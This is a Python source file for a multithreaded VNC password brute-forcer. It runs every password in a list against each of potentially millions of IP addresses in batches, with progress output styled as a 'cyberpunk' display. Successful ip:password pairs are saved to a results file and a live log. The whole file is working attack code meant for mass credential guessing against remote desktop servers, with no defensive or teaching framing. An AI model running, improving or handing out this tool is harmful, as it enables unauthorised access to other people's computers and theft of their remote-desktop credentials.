from concurrent.futures import ThreadPoolExecutor, as_completed
from rfb import RFBProtocol
from matrix_ui import found_box, cyberpunk_summary
import time
from itertools import islice
from collections import deque
import socket

def batcher(iterable, n):
    it = iter(iterable)
    while True:
        batch = list(islice(it, n))
        if not batch:
            break
        yield batch

def try_login(ip, port, password, timeout):
    try:
        rfb = RFBProtocol(ip, password, port, timeout)
        rfb.connect()
        rfb.close()
        return (ip, password), None
    except socket.timeout:
        return None, 'timeout'
    except ConnectionRefusedError:
        return None, 'refused'
    except Exception as e:
        return None, str(e)
    return None, 'unknown'

def brute_force(ips, port, passwords, timeout, threads):
    found_count = 0
    total = None
    timeout_count = 0
    error_count = 0
    if hasattr(ips, '__len__'):
        total = len(ips) * len(passwords)
    start_time = time.time()
    logf = open("output/live.log", "a")
    with open("output/results.txt", "a") as f:
        for ip_batch in batcher(ips, 10000):
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for ip in ip_batch:
                    for pwd in passwords:
                        futures.append(executor.submit(try_login, ip, port, pwd, timeout))
                for future in as_completed(futures):
                    res, err = future.result()
                    elapsed = time.time() - start_time
                    found = False
                    if res:
                        f.write(f"{res[0]}:{res[1]}\n")
                        f.flush()
                        found_count += 1
                        found_box(found_count, res[0], res[1])
                        logf.write(f"FOUND {res[0]}:{res[1]}\n")
                        found = True
                    else:
                        if err == 'timeout':
                            timeout_count += 1
                            logf.write(f"TIMEOUT {ip}\n")
                        elif err == 'refused':
                            logf.write(f"REFUSED {ip}\n")
                            error_count += 1
                        else:
                            error_count += 1
                            logf.write(f"ERROR {ip}: {err}\n")
                    # Afișare live status - actualizez după fiecare rezultat
                    current = found_count + timeout_count + error_count
                    rate = current / elapsed if elapsed > 0 else 0
                    print(f"\rProgress: {current}{'/' + str(total) if total else ''} | Found: {found_count} | Timeouts: {timeout_count} | Errors: {error_count} | Rate: {rate:.2f} tries/sec", end="")
    logf.close()
    duration = time.time() - start_time
    print()  # newline după progresbar
    if total is None:
        total = found_count + timeout_count + error_count
    cyberpunk_summary(found_count, total, duration, mode="BRUTE")
    return None 